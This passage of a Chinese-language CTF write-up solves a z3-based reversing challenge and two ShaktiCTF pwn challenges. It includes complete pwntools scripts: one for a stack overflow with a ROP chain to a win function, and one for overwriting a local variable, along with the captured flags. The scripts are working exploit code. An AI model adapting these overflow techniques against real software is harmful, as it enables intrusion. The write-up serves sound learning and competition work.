    (A[0] - A[0x10]) - A[0x10] == -0x44,
    (A[0xd] + A[0x16]) - A[6] == 0x67,
    (A[0x12] - A[0xc]) - A[0x15] == -0x36,
    A[0xf] * A[10] - A[9] == 0x3604,
    (A[0x18] + A[0x13]) - A[0xe] == 0x81,
    A[0x11] * A[4] - A[7] == 0x3354,
    (A[0xe] + A[8]) - A[1] == 0x9a,
    (A[0x11] + A[0x17]) - A[9] == 0x45,
    A[3] + A[10] * A[0x13] == 0x3265,
    A[0xc] * A[0x15] + A[5] == 0xa88,
    A[0x18] + (A[6] - A[1]) == 0xa7,
    A[0xf] * A[4] + A[0] == 0x3509,
    (A[7] - A[0x12]) - A[0x14] == -0x51,
    A[2] * A[0xb] + A[0x16] == 0x26f7,
    A[8] * A[0x13] + A[9] == 0x2ec7,
    A[0] + (A[10] - A[0x17]) == 0xc0,
    A[3] * A[0x15] + A[0xe] == 0xa22,
    A[1] + A[0xc] + A[0x10] == 0xc5,
    (A[0x14] + A[6]) - A[0xd] == 0x6e,
    A[0x10] + (A[5] - A[0x15]) == 0x8b
    )

# [A = Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(Store(K(Int,
#                                         95),
#                                         7,
#                                         85),
#                                         10,
#                                         119),
#                                         1,
#                                         51),
#                                         11,
#                                         104),
#                                         8,
#                                         110),
#                                         17,
#                                         115),
#                                         18,
#                                         48),
#                                         19,
#                                         108),
#                                         0,
#                                         122),
#                                         12,
#                                         51),
#                                         13,
#                                         110),
#                                         23,
#                                         49),
#                                         21,
#                                         51),
#                                         15,
#                                         117),
#                                    20,
#                                    118),
#                              24,
#                              116),
#                        4,
#                        115),
#                  3,
#                  49),
#            6,
#            102)]
```
:::

爆出來的部分整理一下，得到 flag: `z3_1s_fUn_wh3n_u_s0lv3_1t`

直接包成 flag 格式，或是丟進去程式拿完整的

![](https://i.imgur.com/RFm1YFJ.png)

shaktictf{z3_1s_fUn_wh3n_u_s0lv3_1t}

## pwn
### Play to win
![](https://i.imgur.com/tNuYree.png)

先丟 ghidra

main 的部分很簡單，就是設定 buffer 以及呼叫 game 函數

![](https://i.imgur.com/3qevi8X.png)

game 的部分很簡單，只要輸入長度為 10000 個字元的字就會成功進入 winfunc 獲得勝利

![](https://i.imgur.com/5JETngA.png)

不過 winfunc 沒有作用

![](https://i.imgur.com/cdg2TxG.png)

再次觀察 game 函數，發現在輸入 y/n 的部分使用 scanf 的 %s 來讀，並且 buffer 長度的限制，有明顯的 BOF 漏洞

![](https://i.imgur.com/b3Y3Vxf.png)

![](https://i.imgur.com/Jclignn.png)

確認沒有 canary 和 PIE 保護，看起來是可以 ROP，剩下的問題就是要跳到哪裡

![](https://i.imgur.com/Fnf7Lak.png)

在函數清單中發現有一個 reallywin 函數，會噴出 flag，應該就是目標的位置

![](https://i.imgur.com/gtEjNe4.png)

因此攻擊路徑為 先隨便輸入字 -> y/n 鋪 rop -> 再次隨便輸入字 -> 輸入 n 執行 return

:::spoiler solve.py
```python=
from pwn import *
binary = "./game_12dcfaa0-ade2-43fe-b79f-288b3b9560f8"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.binary = binary
context.log_level = "debug"

conn = remote("65.2.136.80", 31803)
# conn = process(binary)
# conn = gdb.debug(binary)

conn.sendlineafter(b"word:", b"0")

payload = b"A"*(0x18+8)
payload += p64(0x401258) # ret
payload += p64(0x401383) # reallywin
conn.sendlineafter(b"[y/n]:", payload)

conn.sendlineafter(b"word:", b"0")

conn.sendlineafter(b"[y/n]:", b"n")

conn.interactive()
```
:::

ROP 裡面會要再有一個 ret 的原因是為了 stack alignment 的問題

成功執行

![](https://i.imgur.com/Kib1BMM.png)

shakti{G0od_joB_5olviNg_Thi5_1}

### guess_the_key
![](https://i.imgur.com/trz8rRq.png)

ghidra 時間

在 main 裡面，基本上就是 call func 函數而已

![](https://i.imgur.com/yWYsO3b.png)

在 func 裡面，可以看到只要想辦法將 local_c 變數覆蓋掉，即可獲得 flag

![](https://i.imgur.com/iqUJYm2.png)

基本上就是把 buffer 填滿，再填剩下的變數值就可以了

:::spoiler solve.py
```python=
from pwn import *
binary = "./variable_60f44897-4fc7-4893-a7c6-f74a72ae3c27"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("65.2.136.80", 32569)
# conn = process(binary)
# conn = gdb.debug(binary)

payload = b"A"*60
payload += bytes.fromhex("cafebabe")[::-1]

conn.sendlineafter(b"Enter the key: ", payload)
conn.interactive()
```
:::

裡面的 -0x35014542 就等同於 0xcafebabe

![](https://i.imgur.com/fLyIu4d.png)

shakti{0verWr171ng_15_FuN}